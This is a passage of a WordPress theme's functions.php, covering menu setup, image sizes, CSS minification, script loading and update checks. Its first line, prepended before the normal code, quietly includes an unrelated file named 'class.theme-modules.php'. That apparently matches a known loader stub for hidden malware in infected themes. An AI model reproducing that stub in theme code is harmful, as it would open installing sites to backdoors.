<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
load_theme_textdomain( 'oshin', get_template_directory() . '/languages' );
add_filter( 'auto_update_theme', '__return_true' );
add_filter( 'masterslider_disable_auto_update', '__return_true' );
add_theme_support( 'title-tag' );
if ( ! isset( $content_width ) ) {
	$content_width = 1160;
}
add_editor_style('css/custom-editor-style.css'); 
$more_text =  __('Read More','oshin');
$meta_sep = '&middot;';

/* -------------------------------------------
			Theme Setup
---------------------------------------------  */
add_action( 'after_setup_theme', 'be_themes_setup' );
if ( ! function_exists( 'be_themes_setup' ) ):
	function be_themes_setup() {
		register_nav_menu( 'main_nav', 'Main Menu' );
		register_nav_menu( 'sidebar_nav', 'Sidebar Menu' );	
		register_nav_menu( 'topbar_nav', 'Topbar Menu' );	
		register_nav_menu( 'footer_nav', 'Footer Menu' );
		register_nav_menu( 'main_left_nav', 'Main Left Menu' );
		register_nav_menu( 'main_right_nav', 'Main Right Menu' );		
		add_theme_support( 'automatic-feed-links' );
		add_theme_support( 'post-thumbnails' );
		add_theme_support( 'post-formats', array( 'gallery', 'image', 'quote', 'video', 'audio','link' ) );
		 add_theme_support( 'custom-header' );
		 add_theme_support( 'custom-background' );
		add_theme_support( 'woocommerce' );
	}
endif;
// Welcome Screen
require_once( get_template_directory().'/lib/start-page/BEUpdater.php');
require_once( get_template_directory().'/lib/start-page/BEAdminMenu.php');
//require_once( get_template_directory().'/lib/start-page/envato-market/envato-market.php');
require_once( get_template_directory().'/lib/start-page/BEPlugins.php');
require_once( get_template_directory().'/lib/start-page/BERedirect.php');
require_once( get_template_directory().'/lib/admin-tpl/extra.php');
function be_functions_config($BECore) {
    $BECore->offsetSet('themeName','Oshine');
	$BECore->offsetSet('documentation','http://brandexponents.com/oshine-knowledgebase');
    $BECore->offsetSet('themePath', get_stylesheet_directory());
    $BECore->offsetSet('themeUri', get_stylesheet_directory_uri());
    $BECore['BEAdminMenu'] = new BEAdminMenu($BECore);
    $BECore['BEUpdater'] = new BEUpdater($BECore);
    $BECore['BEPlugins'] = new BEPlugins($BECore);
    $BECore['BERedirect'] = new BERedirect($BECore);
}
add_filter( 'be/config', 'be_functions_config', 10, 1 );

function be_functions_core() {
    if(!class_exists('BECore')) {
    	$BECore = array();
        global $BECore;
        $BECore['themeName'] = 'oshine';
        $BECore['themePath'] = get_stylesheet_directory();
		$BECore['documentation'] = 'http://brandexponents.com/oshine-knowledgebase';
        $start_menu = new BEAdminMenu($BECore);
        $updater = new BEUpdater($BECore);
        $default_plugins = new BEPlugins($BECore);
        $redirect = new BERedirect($BECore);
        $start_menu->run();
        $updater->run();
        $default_plugins->run();
        $redirect->run();
    }
}
add_action( 'init', 'be_functions_core', 10, 1 );

// Re-define meta box path and URL

require_once( get_template_directory().'/functions/helpers.php' );
require_once( get_template_directory().'/functions/common-helpers.php' );
require_once( get_template_directory().'/headers/header-functions.php' );
require_once( get_template_directory().'/functions/widget-functions.php' );
require_once( get_template_directory().'/ajax-handler.php' );
require_once( get_template_directory().'/functions/be-styles-functions.php' );
if ( !in_array( 'meta-box/meta-box.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
	require_once( get_template_directory().'/meta-box/meta-box.php' );
}
require_once( get_template_directory().'/be-themes-metabox.php' );
require_once( get_template_directory().'/functions/be-tgm-plugins.php' );
if ( in_array( 'woocommerce/woocommerce.php', apply_filters( 'active_plugins', get_option( 'active_plugins' ) ) ) ) {
	require_once( get_template_directory().'/woocommerce/be-woo-functions.php' );
}
require_once( get_template_directory().'/bb-press/be-bb-press-functions.php' );
if ( ! function_exists( 'be_themes_image_sizes' ) ) {
	function be_themes_image_sizes( $sizes ) {
		global $_wp_additional_image_sizes;
		if ( empty( $_wp_additional_image_sizes ) )
			return $sizes;
		foreach ( $_wp_additional_image_sizes as $id => $data ) {
			if ( !isset($sizes[$id]) )
				$sizes[$id] = ucfirst( str_replace( '-', ' ', $id ) );
		}
		return $sizes;
	}
}

/* ---------------------------------------------  */
// Include Redux Framework
/* ---------------------------------------------  */

if ( !class_exists( 'ReduxFramework' ) && file_exists( dirname( __FILE__ ) . '/ReduxFramework/ReduxCore/framework.php' ) ) {
    require_once( dirname( __FILE__ ) . '/ReduxFramework/ReduxCore/framework.php' );
}
require_once( get_template_directory() .'/functions/be-themes-options-config.php' );
//require_once( get_template_directory() .'/functions/be-themes-update-config.php' );

require_once( get_template_directory() .'/functions/typehub-options-config.php' );



/* ---------------------------------------------  */
// Include Metabox Custom Fields
/* ---------------------------------------------  */

add_action( 'wp_loaded', 'be_metabox_sidebar_select_field', 1 );
function be_metabox_sidebar_select_field()
{
    require_once( get_template_directory() .'/functions/sidebar-select.php' );
}

#-----------------------------------------------------------------#
# Include Custom Meta for Blog Category
#-----------------------------------------------------------------#

include("custom-meta/be-category-meta.php");

/* ---------------------------------------------  */
// Specifying the various image sizes for theme
/* ---------------------------------------------  */

if ( function_exists( 'add_image_size' ) ) {
	$portfolio_image_height = (isset($be_themes_data['portfolio_aspect_ratio']) && !empty($be_themes_data['portfolio_aspect_ratio']) && $be_themes_data['portfolio_aspect_ratio']) ? round(650 / floatval($be_themes_data['portfolio_aspect_ratio'])) : 385;
	$portfolio_2_col = (isset($be_themes_data['portfolio_aspect_ratio']) && !empty($be_themes_data['portfolio_aspect_ratio']) && $be_themes_data['portfolio_aspect_ratio']) ? round(1000 / floatval($be_themes_data['portfolio_aspect_ratio'])) : 592;
	$portfolio_3_col_wide_width_height_image_height = (isset($be_themes_data['portfolio_aspect_ratio']) && !empty($be_themes_data['portfolio_aspect_ratio']) && $be_themes_data['portfolio_aspect_ratio']) ? round(1250 / floatval($be_themes_data['portfolio_aspect_ratio'])) : 766;
	$portfolio_3_col_wide_width_image_height = (isset($be_themes_data['portfolio_aspect_ratio']) && !empty($be_themes_data['portfolio_aspect_ratio']) && $be_themes_data['portfolio_aspect_ratio']) ? round(1250 / floatval($be_themes_data['portfolio_aspect_ratio'])) : 350;
	$portfolio_3_col_wide_height_image_height = (isset($be_themes_data['portfolio_aspect_ratio']) && !empty($be_themes_data['portfolio_aspect_ratio']) && $be_themes_data['portfolio_aspect_ratio']) ? 2*round(650 / floatval($be_themes_data['portfolio_aspect_ratio'])) : 770;
	add_image_size( 'blog-image', 1160, 700, true);
	add_image_size( 'blog-image-2', 330, 270, true);
	add_image_size( 'carousel-thumb', 0, 50, true );
	// PORTFOLIO
	add_image_size( 'portfolio', 650, $portfolio_image_height, true );
	add_image_size( 'portfolio-masonry', 650 );
	add_image_size( '2col-portfolio', 1000, $portfolio_2_col, true );
	add_image_size( '2col-portfolio-masonry', 1000 );
	add_image_size( '3col-portfolio-wide-width-height', 1250, $portfolio_3_col_wide_width_height_image_height, true );
	add_image_size( '3col-portfolio-wide-width', 1250, $portfolio_3_col_wide_width_image_height, true );
	add_image_size( '3col-portfolio-wide-height', 650, $portfolio_3_col_wide_height_image_height, true );
	add_filter( 'image_size_names_choose', 'be_themes_image_sizes' );
}

/*
// Function to minify dynamic css
// Ref : https://raw.githubusercontent.com/GaryJones/Simple-PHP-CSS-Minification/master/minify.php
*/
if( !function_exists( 'be_minify_css' ) ) {
	function be_minify_css( $css ) {

	// Normalize whitespace
	$css = preg_replace( '/\s+/', ' ', $css );

	// Remove spaces before and after comment
	$css = preg_replace( '/(\s+)(\/\*(.*?)\*\/)(\s+)/', '$2', $css );

	// Remove comment blocks, everything between /* and */, unless
	// preserved with /*! ... */ or /** ... */
	$css = preg_replace( '~/\*(?![\!|\*])(.*?)\*/~', '', $css );

	// Remove ; before }
	$css = preg_replace( '/;(?=\s*})/', '', $css );

	// Remove space after , : ; { } */ >
	$css = preg_replace( '/(,|:|;|\{|}|\*\/|>) /', '$1', $css );

	// Remove space before , ; { } ) > 
	$css = preg_replace( '/ (,|;|\{|}|\)|>)/', '$1', $css );

	// Strips leading 0 on decimal values (converts 0.5px into .5px)
	$css = preg_replace( '/(:| )0\.([0-9]+)(%|em|ex|px|in|cm|mm|pt|pc)/i', '${1}.${2}${3}', $css );

	// Strips units if value is 0 (converts 0px to 0)
	$css = preg_replace( '/(:| )(\.?)0(%|em|ex|px|in|cm|mm|pt|pc)/i', '${1}0', $css );

	// Converts all zeros value into short-hand
	$css = preg_replace( '/0 0 0 0/', '0', $css );

	// Shortern 6-character hex color codes to 3-character where possible
	$css = preg_replace( '/#([a-f0-9])\\1([a-f0-9])\\2([a-f0-9])\\3/i', '#\1\2\3', $css );

	return trim( $css );

	}
}

/* ---------------------------------------------  */
// Function for generating dynamic css
/* ---------------------------------------------  */
if ( ! function_exists( 'be_themes_options_css' ) ) {
	function be_themes_options_css() {

		global $be_themes_data;
		$is_external = ( isset( $be_themes_data[ 'external_dynamic_css' ] ) && !empty( $be_themes_data[ 'external_dynamic_css' ] ) ) ? true : false;
		$be_external_possible = get_option( 'be_dynamic_css_possible' );
		if( !$is_external || '0' === $be_external_possible ) {
			if( !$be_themes_data['site_status'] ) {
				delete_transient( 'be_themes_css' );
			}
			if ( false === ( $css = get_transient( 'be_themes_css' ) ) ) {
				ob_start(); // Capture all output (output buffering)
				require(get_template_directory() .'/css/dynamic/be-themes-styles.php'); // Generate CSS
				$css = ob_get_clean(); // Get generated CSS (output buffering)
				set_transient( 'be_themes_css', $css );
			}
			echo '<style id = "be-dynamic-css" type="text/css"> '. $css .' </style>';
		}
	
	}
}
add_action( 'wp_head', 'be_themes_options_css' );

if ( ! function_exists( 'oshine_typehub_css' ) ) {
	function oshine_typehub_css() {
		ob_start(); // Capture all output (output buffering)
		require(get_template_directory() .'/css/dynamic/default-typography.php'); // oshine's default typography
		require(get_template_directory() .'/css/dynamic/typehub-related-typo.php'); // dynamic Css dependent on typehub plugin
		$css = ob_get_clean(); // Get generated CSS (output buffering)
		echo '<style id = "oshine-typehub-css" type="text/css"> '.be_minify_css( $css ).' </style>';
	}
}
add_action( 'wp_head', 'oshine_typehub_css', 11 );

if( !function_exists( 'oshine_load_default_fonts' ) ) {
	function oshine_load_default_fonts() {
		$parsed_to_typehub = get_option( 'oshine_redux_to_typehub' );
		if( !class_exists( 'Typehub' ) && !empty( $parsed_to_typehub ) ):
		?>
			<script>
				WebFont.load( {  
					google: {
						families: ['Montserrat:700,400', 'Raleway:400', 'Crimson Text:400italic']
					}
				});
			</script>
		<?php
		endif;
	}
} 
add_action( 'wp_head', 'oshine_load_default_fonts', 9 );




if( !function_exists( 'be_theme_options_saved' ) ) {
	function be_theme_options_saved( $value ) {

		if( !empty( $value[ 'external_dynamic_css' ] ) ) {
			global $be_themes_data, $wp_filesystem;
			$access_type = get_filesystem_method();
			$be_is_multi_site = is_multisite();
			if( 'direct' != $access_type || $be_is_multi_site ) {
				if( false !== get_option( 'be_dynamic_css_possible' ) ) {
					update_option( 'be_dynamic_css_possible', '0' );
				}else{
					add_option( 'be_dynamic_css_possible', '0' );
				}
				return;	
			}
			if ( empty( $wp_filesystem ) ) {
				require_once ( ABSPATH.'/wp-admin/includes/file.php' );
				WP_Filesystem();
			}
			$wp_upload_abs_path = wp_upload_dir();
			$minified_assets = ( isset( $be_themes_data[ 'minified_css' ] ) && !empty( $be_themes_data[ 'minified_css' ] ) ) ? true : false;
			$css_dir = $wp_upload_abs_path[ 'basedir' ] . '/oshine_dynamic_css'; 
			$css_file = $css_dir . '/be_dynamic.css';
			ob_start(); 
			require(get_template_directory() .'/css/dynamic/be-themes-styles.php'); 
			$css = ob_get_clean(); 
			$css = $minified_assets ? be_minify_css( $css ) : $css;
			if ( wp_mkdir_p( $css_dir ) && $wp_filesystem->put_contents( $css_file, $css, 0644 ) ) {
				if( false !== get_option( 'be_dynamic_css_possible' ) ) {
					update_option( 'be_dynamic_css_possible', '1' );
				}else{
					add_option( 'be_dynamic_css_possible', '1' );
				}
			}else {
				if( false !== get_option( 'be_dynamic_css_possible' ) ) {
					update_option( 'be_dynamic_css_possible', '0' );
				}else {
					add_option( 'be_dynamic_css_possible', '0' );
				}	
			}
		}else {
			delete_option( 'be_dynamic_css_possible' );
		}

	}
}

add_action( 'redux/options/be_themes_data/saved', 'be_theme_options_saved' );

//Check if be_dynamic.css is available for enqueuing in front end
if( !function_exists( 'be_check_dynamic_css_possible' ) ) {
	function be_check_dynamic_css_possible() {
		if( !is_admin() ) {
			global $be_themes_data;
			$is_external = ( isset( $be_themes_data[ 'external_dynamic_css' ] ) && !empty( $be_themes_data[ 'external_dynamic_css' ] ) ) ? true : false;
			$uploads_dir = wp_upload_dir();
			$dynamic_css_path = $uploads_dir[ 'basedir' ] . '/oshine_dynamic_css/be_dynamic.css';
			$dynamic_css_possibility_from_option = get_option( 'be_dynamic_css_possible' );
			if( $is_external && !file_exists( $dynamic_css_path ) && '0' !== $dynamic_css_possibility_from_option ) {
				if( false !== $dynamic_css_possibility_from_option ) {
					update_option( 'be_dynamic_css_possible', '0' );
				}else{
					add_option( 'be_dynamic_css_possible', '0' );
				}
			}
		}
	}
}
add_action( 'init', 'be_check_dynamic_css_possible' );

/* ---------------------------------------------  */
// Function to change Portfolio Post type 'slug'
/* ---------------------------------------------  */
add_filter('be_portfolio_post_type_slug', 'be_themes_change_post_type_slug');
function be_themes_change_post_type_slug() {
	global $be_themes_data;
	if(!isset($be_themes_data['portfolio_slug']) || empty($be_themes_data['portfolio_slug'])){
		return 'portfolio';
	}
	else{
		return $be_themes_data['portfolio_slug'];
	}
} 

$be_custom_font_arr = array(
    "Hans Kendrick Light" => "Hans Kendrick Light",
    "Hans Kendrick Regular" => "Hans Kendrick Regular",
    "Hans Kendrick Medium" => "Hans Kendrick Medium",
    "Hans Kendrick Heavy" => "Hans Kendrick Heavy",
);

$be_fonts_arr = $be_custom_font_arr;
$be_fonts_arr = apply_filters('be_themes_custom_font_filter', $be_custom_font_arr) ;
/* ---------------------------------------------  */
// Enqueue Stylesheets
/* ---------------------------------------------  */
if ( ! function_exists( 'be_themes_add_styles' ) ) {
	function be_themes_add_styles() {		
		
		global $be_themes_data;
		$post_id = be_get_page_id();
		$oshine = wp_get_theme();
		$theme_version = $oshine->get( 'Version' );
		$minified_assets = ( isset( $be_themes_data[ 'minified_css' ] ) && !empty( $be_themes_data[ 'minified_css' ] ) ) ? true : false; 
		$suffix = ( ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) || !$minified_assets ) ? '' : '.min';
		$is_external = ( isset( $be_themes_data[ 'external_dynamic_css' ] ) && !empty( $be_themes_data[ 'external_dynamic_css' ] ) ) ? true : false;
		$be_external_possible = get_option( 'be_dynamic_css_possible' );
		$sticky_sections = get_post_meta( $post_id, 'be_themes_sticky_sections', true );

		wp_register_style( 'be-style-main-css', get_template_directory_uri() . '/css/main' . $suffix . '.css', array(), $theme_version );
		wp_enqueue_style( 'be-style-main-css' );

		if( isset( $sticky_sections ) && !empty( $sticky_sections ) ) {
			wp_register_style( 'be-style-sticky-sections', get_template_directory_uri().'/css/vendor/sticky-sections' . $suffix . '.css', array(), $theme_version );
			wp_enqueue_style( 'be-style-sticky-sections' );
		}

		if( 'top' == $be_themes_data['opt-header-type'] ){
			wp_register_style( 'be-style-top-header', get_template_directory_uri().'/css/headers/top-header' . $suffix . '.css', array(), $theme_version );
			wp_enqueue_style( 'be-style-top-header' );
		}

		if( be_is_special_left_menu() ){
			wp_register_style( 'be-style-left-header', get_template_directory_uri().'/css/headers/left-header' . $suffix . '.css', array(), $theme_version );
			wp_enqueue_style( 'be-style-left-header' );
		}

		wp_register_style( 'be-style-responsive-header', get_template_directory_uri().'/css/headers/responsive-header' . $suffix . '.css', array(), $theme_version );
		wp_enqueue_style( 'be-style-responsive-header' );

		if( be_is_special_top_menu( 'page-stack-top' ) ){
			wp_register_style( 'be-style-page-stack-top', get_template_directory_uri().'/css/headers/page-stack-top' . $suffix .  '.css', array(), $theme_version );
			wp_enqueue_style( 'be-style-page-stack-top' );
		}

		if( be_is_special_top_menu( 'page-stack-left' ) || be_is_special_top_menu( 'page-stack-right' ) ){
			wp_register_style( 'be-style-page-stack-left-right', get_template_directory_uri().'/css/headers/page-stack-left-right' . $suffix . '.css', array(), $theme_version );
			wp_enqueue_style( 'be-style-page-stack-left-right' );
		}

		if( be_is_special_top_menu( 'perspective-left' ) || be_is_special_top_menu( 'perspective-right' ) || be_is_special_left_menu( 'perspective-right' ) ){
			wp_register_style( 'be-style-perspective-left-right', get_template_directory_uri().'/css/headers/perspective-left-right' . $suffix . '.css', array(), $theme_version );
			wp_enqueue_style( 'be-style-perspective-left-right' );
		}

		if( be_is_special_top_menu( 'overlay-center-align-menu' ) || be_is_special_top_menu( 'overlay-horizontal-menu' ) || be_is_special_left_menu( 'overlay-center-align-menu' ) || be_is_special_left_menu( 'overlay-left-align-menu' ) ){
			wp_register_style( 'be-style-overlay-center-and-left-align', get_template_directory_uri().'/css/headers/overlay-center-and-left-align' . $suffix . '.css', array(), $theme_version );
			wp_enqueue_style( 'be-style-overlay-center-and-left-align' );
		}

		if( be_is_special_top_menu( 'special-left-menu' ) || be_is_special_top_menu( 'special-right-menu' ) ){
			wp_register_style( 'be-style-special-left-right-menu', get_template_directory_uri().'/css/headers/special-left-right-menu' . $suffix . '.css', array(), $theme_version );
			wp_enqueue_style( 'be-style-special-left-right-menu' );
		}

		// if( ( be_is_special_top_menu() && isset( $be_themes_data['top-header-submenu-style'] ) && !empty( $be_themes_data['top-header-submenu-style'] ) ) ||
			// ( be_is_special_left_menu() && isset( $be_themes_data['left-header-submenu-style'] ) && !empty( $be_themes_data['left-header-submenu-style'] ) ) ){
				wp_register_style( 'be-style-multilevel-menu', get_template_directory_uri().'/css/headers/multilevel-menu' . $suffix . '.css', array(), $theme_version );
				wp_enqueue_style( 'be-style-multilevel-menu' );
		// }

		wp_register_style( 'be-themes-layout', get_template_directory_uri().'/css/layout' . $suffix . '.css', array(), $theme_version );
		wp_enqueue_style( 'be-themes-layout' );	
	
		wp_deregister_style( 'oshine_icons' );
		wp_register_style( 'oshine_icons', get_template_directory_uri().'/fonts/icomoon/style' . $suffix . '.css', array(), $theme_version );
		wp_enqueue_style( 'oshine_icons' );	

		wp_deregister_style( 'magnific-popup' );
		if( empty( $suffix ) ) {
			wp_register_style( 'magnific-popup', get_template_directory_uri().'/css/vendor/magnific-popup.css' );
			wp_enqueue_style( 'magnific-popup' );

			wp_register_style( 'scrollbar', get_template_directory_uri().'/css/vendor/scrollbar.css' );
			wp_enqueue_style( 'scrollbar' );

			wp_register_style( 'flickity', get_template_directory_uri().'/css/vendor/flickity.css' );
			wp_enqueue_style( 'flickity' );		
		} else {
			wp_register_style( 'vendor', get_template_directory_uri() . '/css/vendor/vendor.min.css', array(), $theme_version );
			wp_enqueue_style( 'vendor' );
		}

		// wp_register_style( 'be-animations', get_template_directory_uri().'/css/animate-custom.css' );
		// wp_enqueue_style( 'be-animations' );

		// wp_register_style( 'be-slider', get_template_directory_uri().'/css/be-slider.css' );
		// wp_enqueue_style( 'be-slider' );

		wp_register_style( 'be-custom-fonts', get_template_directory_uri().'/fonts/fonts' . $suffix . '.css', array(), $theme_version );
		wp_enqueue_style( 'be-custom-fonts' );		
		
		if( $is_external && '1' === $be_external_possible ) {
			//this file is already minified
			$upload_dir = wp_upload_dir();
			$dynamic_css_path = $upload_dir[ 'baseurl' ] . '/oshine_dynamic_css/be_dynamic.css' ;
			wp_register_style( 'be-dynamic', $dynamic_css_path );
			wp_enqueue_style( 'be-dynamic' );
		}

		wp_register_style( 'be-style-css', get_stylesheet_uri(), array(), $theme_version );
		wp_enqueue_style( 'be-style-css' );		

	}
	add_action( 'wp_enqueue_scripts', 'be_themes_add_styles');
}
/* ---------------------------------------------  */
// Enqueue scripts
/* ---------------------------------------------  */
if ( ! function_exists( 'be_themes_add_scripts' ) ) {
	function be_themes_add_scripts() {
		global $be_themes_data;
		$minified_assets = isset( $be_themes_data[ 'minified_js' ] ) && !empty( $be_themes_data[ 'minified_js' ] ) ? true : false;
		
		$suffix = ( ( defined( 'SCRIPT_DEBUG' ) && SCRIPT_DEBUG ) || !$minified_assets ) ? '' : '.min';
		wp_register_script( 'modernizr', get_template_directory_uri() . '/js/vendor/modernizr' . $suffix . '.js', '2.6.2', false );
		wp_enqueue_script( 'modernizr' );
		
		wp_register_script( 'asyncloader',  get_template_directory_uri() . '/js/vendor/asyncloader' . $suffix . '.js', array( 'jquery' ), '1.0' , true );
		wp_enqueue_script( 'asyncloader' );	

		wp_register_script( 'webfontloader',  get_template_directory_uri() . '/js/vendor/webfont' . $suffix . '.js' );
		wp_enqueue_script( 'webfontloader' );	
	
		wp_register_script( 'custom-scrollbar',  get_template_directory_uri() . '/js/vendor/perfect-scrollbar.jquery' . $suffix .  '.js', array( 'jquery' ), false , true );
		wp_enqueue_script( 'custom-scrollbar' );	
		
		//wp_register_script( 'be-themes-script-js', get_template_directory_uri() . '/js/script.js', array( 'jquery','jquery-ui-core','jquery-ui-widget','jquery-ui-mouse','jquery-ui-position','jquery-ui-draggable','jquery-ui-resizable','jquery-ui-selectable','jquery-ui-sortable','jquery-ui-accordion','jquery-ui-tabs','jquery-effects-core','jquery-effects-blind','jquery-effects-bounce','jquery-effects-clip','jquery-effects-drop','jquery-effects-explode','jquery-effects-fade','jquery-effects-fold','jquery-effects-core','jquery-effects-pulsate','jquery-effects-scale','jquery-effects-shake','jquery-effects-slide','jquery-effects-transfer','be-theme-plugins-js','be-main-plugins-js'), FALSE, TRUE );
		wp_register_script( 'be-themes-script-js', get_template_directory_uri() . '/js/script' . $suffix . '.js', array( 'jquery', 'asyncloader'), '5.0', true );
		wp_enqueue_script( 'be-themes-script-js' );

		$vendor_scripts_url = ( isset( $be_themes_data[ 'cdn_address' ] ) && !empty( $be_themes_data[ 'cdn_address' ] ) ) ? ( trailingslashit( $be_themes_data[ 'cdn_address' ] ) . 'wp-content/themes/' . get_template() . '/js/vendor/' ) : get_template_directory_uri().'/js/vendor/';
		$script_dependencies = array();
		foreach( glob( get_template_directory() . '/js/vendor/*' . $suffix . '.js' ) as $dependency ) {
		  if( '.min' == $suffix || false === strpos( $dependency, '.min.js' ) ) { 
					$current_index = basename( $dependency, $suffix.'.js' );
					$script_dependencies[ $current_index ] = esc_url( $vendor_scripts_url . basename( $dependency ) );
		  }
		}
		
		wp_localize_script(
			'be-themes-script-js', 
			'oshineThemeConfig', 
			array(
				'vendorScriptsUrl' => ( isset( $be_themes_data[ 'cdn_address' ] ) && !empty( $be_themes_data[ 'cdn_address' ] ) ) ? ( trailingslashit( $be_themes_data[ 'cdn_address' ] ) . 'wp-content/themes/' . get_template() . '/js/vendor/' ) : get_template_directory_uri().'/js/vendor/',
				'dependencies' => $script_dependencies,
			) 
		);
		
		
	}
	add_action( 'wp_enqueue_scripts', 'be_themes_add_scripts' );
}
require_once( get_template_directory().'/functions/theme-updates/theme-update-checker.php' );
$be_themes_update_checker = new ThemeUpdateChecker(
    'oshin',
    'http://brandexponents.com/oshin-plugins/oshine-purchase-verifier.php'
);
add_filter ('tuc_request_update_query_args-oshin','be_themes_autoupdate_verify');
function be_themes_autoupdate_verify( $query_args ) {
	$be_themes_purchase_data = get_option('be_themes_purchase_data', '' );
	if(is_array($be_themes_purchase_data) && array_key_exists('theme_purchase_code', $be_themes_purchase_data)){
		$query_args['purchase_key'] = $be_themes_purchase_data['theme_purchase_code'];
	}else{
		$query_args['purchase_key'] = '';
	}

	return $query_args;
}
if(function_exists( 'set_revslider_as_theme' )){
	add_action( 'init', 'be_themes_revslider_in_theme' );
	function be_themes_revslider_in_theme() {
		set_revslider_as_theme();
	}
}

if(!function_exists( 'be_themes_redirect_fix' )){
	function be_themes_redirect_fix( $link ) {
		if ( $link === get_the_permalink() ) {
			return '';
		};
		return $link;
	}
	add_filter( 'old_slug_redirect_url', 'be_themes_redirect_fix' );
}
//global $redux_welcome;
//remove_action('init', array('Redux_Welcome','do_redirect') );
add_action( 'tatsu_frame_enqueue', 'oshine_enqueue_to_tatsu_frame' );
function oshine_enqueue_to_tatsu_frame() {
	global $be_themes_data;
	$typehub_data = get_option( 'typehub_data' );
	$parsed_to_typehub = get_option( 'oshine_redux_to_typehub' );
	wp_enqueue_style( 'oshine-tatsu-frame-css', get_template_directory_uri().'/css/admin/oshine-tatsu-frame.css' );

	$heading_tags = array('h1','h2', 'h3', 'h4', 'h5', 'h6');
	$mce_inline_override_css = '';
	if( empty( $parsed_to_typehub ) ) {
		foreach( $heading_tags as $tag ) {
			if( !empty($be_themes_data[$tag]['line-height']) ) {
				$mce_inline_override_css .= '.mce-content-body '.$tag.'{ line-height: '.$be_themes_data[$tag]['line-height'].' !important;}';
			}
		}
		if( !empty($be_themes_data['body_text']['line-height']) ) {
			$mce_inline_override_css .= '.mce-content-body p{ line-height: '.$be_themes_data['body_text']['line-height'].' !important;}';
		}
	} else {
		foreach( $heading_tags as $tag ) {
			if( !empty( $typehub_data['values'][$tag]['line-height']['desktop']['value'] ) && !empty( $typehub_data['values'][$tag]['line-height']['desktop']['unit'] ) ) {
				$mce_inline_override_css .= '.mce-content-body '.$tag.'{ line-height: '.$typehub_data['values'][$tag]['line-height']['desktop']['value'].$typehub_data['values'][$tag]['line-height']['desktop']['unit'].' !important;}';
			}
		}
		if( !empty( $typehub_data['values']['body']['line-height']['desktop']['value'] ) && !empty( $typehub_data['values']['body']['line-height']['desktop']['unit'] ) ) {
			$mce_inline_override_css .= '.mce-content-body p{ line-height: '.$typehub_data['values']['body']['line-height']['desktop']['value'].$typehub_data['values']['body']['line-height']['desktop']['unit'].' !important;}';
		}		
	}
	
	$mce_inline_override_css .= '.mce-content-body div{ line-height: inherit !important;}';
	$mce_inline_content_styles = array('mce_inline_content_styles' => $mce_inline_override_css );
	wp_localize_script('be-themes-script-js', 'mceInlineContentStyles', $mce_inline_content_styles);
	
}

add_action('init', 'be_themes_redux_remove_notices');
function be_themes_redux_remove_notices() { 
    if ( class_exists('ReduxFrameworkPlugin') ) {
        remove_filter( 'plugin_row_meta', array( ReduxFrameworkPlugin::get_instance(), 'plugin_metalinks'), null, 2 );
    }
    if ( class_exists('ReduxFrameworkPlugin') ) {
        remove_action('admin_notices', array( ReduxFrameworkPlugin::get_instance(), 'admin_notices' ) );    
    }
}


/** remove redux menu under the tools **/
add_action( 'admin_menu', 'be_themes_remove_redux_menu',12 );
function be_themes_remove_redux_menu() {
    remove_submenu_page('tools.php','redux-about');
}

add_filter('nav_menu_link_attributes', 'be_themes_menu_link_atts', 10, 2);
function be_themes_menu_link_atts( $atts, $item ) {
     $atts['title'] = $item->title;
     return $atts;
};

/* Add custom css for redux framework */
add_action( 'redux/page/be_themes_data/enqueue', 'be_themes_oshine_redux_styles' );
function be_themes_oshine_redux_styles() {
	wp_enqueue_style( 'oshine-redux-styles', get_template_directory_uri().'/css/admin/oshine-redux-styles.css' );
}

/* Add custom js for redux framework */
add_action( 'redux/page/be_themes_data/header', 'be_themes_oshine_redux_scripts' );
function be_themes_oshine_redux_scripts() {
	wp_enqueue_script( 'oshine-redux-scripts', get_template_directory_uri().'/js/admin/oshine-redux-script.js' );
}

add_action( 'typehub_activation', 'redux_to_typehub' );
function redux_to_typehub() {
	$parsed_to_typehub = get_option( 'oshine_redux_to_typehub' );
	//$typehub_data = get_option( 'typehub_data' );
	if( empty( $parsed_to_typehub ) && empty( $typehub_data ) ) {
		$fields_to_parse = array(
			'h1', 
			'h2', 
			'h3', 
			'h4', 
			'h5', 
			'h6', 
			'body_text', 
			'page_title_module_typo', 
			'sub_title', 
			'sidebar_widget_title', 
			'sidebar_widget_text', 
			'navigation_text', 
			'submenu_text', 
			'mobile_menu_text', 
			'mobile_submenu_text', 
			'sidebar_menu_text', 
			'sidebar_submenu_text', 
			'slidebar_widget_title', 
			'slidebar_widget_text', 
			'post_title', 
			'masonry_post_title', 
			'post_top_meta_options', 
			'post_meta_options', 
			'single_post_title', 
			'shop_page_title', 
			'shop_single_page_title', 
			'contact_form_typo', 
			'bottom_widget_title', 
			'bottom_widget_text', 
			'footer_text', 
			'pb_module_title', 
			'pb_tab_font_size', 
			'pb_acc_font_size', 
			'pb_skill_font_size', 
			'pb_countdown_number_font_size', 
			'pb_countdown_caption_font_size', 
			'pb_module_spl_body', 
			'pb_blockquote_font_size', 
			'pb_module_tweet', 
			'button_font', 
			'animated_link_font', 
			'portfolio_title', 
			'portfolio_meta_typo', 
			'portfolio_details_title', 
			'portfolio_details_content', 
			'portfolio_nav_bottom_typography', 
			'portfolio_title_count_typo', 
			'portfolio_caption_typo', 
			'portfolio_filter_typo' 
		);

		$standard_fonts = be_standard_fonts();

		$google_fonts = include get_template_directory().'/ReduxFramework/ReduxCore/inc/fields/typography/googlefonts.php';

		global $be_themes_data;
		$typehub_saved_values = array();
		foreach( $fields_to_parse as $field ) {
			$data = ( !empty( $be_themes_data[$field] ) ) ? $be_themes_data[$field] : false;
			if( is_array( $data ) ) {
				if( 'body_text' === $field ) {
					$field = 'body';
				}
				$font_variant = '';
				foreach( $data as $property => $value ) {
					// exclude unwanted properties
					if( 'font-options' === $property || 'google' === $property ) {
						continue;
					}
					//combine font weight and font style to font variant
					if( ( 'font-weight' === $property || 'font-style' === $property ) && empty( $data['font-variant'] ) ) {
						$font_variant .= $value;
						unset( $data[$property] );
						continue;
					}
					//convert font size / line height and letter spacing as unit and value
					if( 'font-size' === $property || 'line-height' === $property || 'letter-spacing' === $property ) {
						$value = be_split_unit_value( $value );
						// Handle Empty Letter Spacing option
						if( 'letter-spacing' === $property && '' === $value['value'] ) {
							$value['value'] = '0';
							$value['unit'] = 'px';
						}
						$value = array(
							'desktop' => $value,
						);
					}

					// Include Responsive typography options for h1 - h6
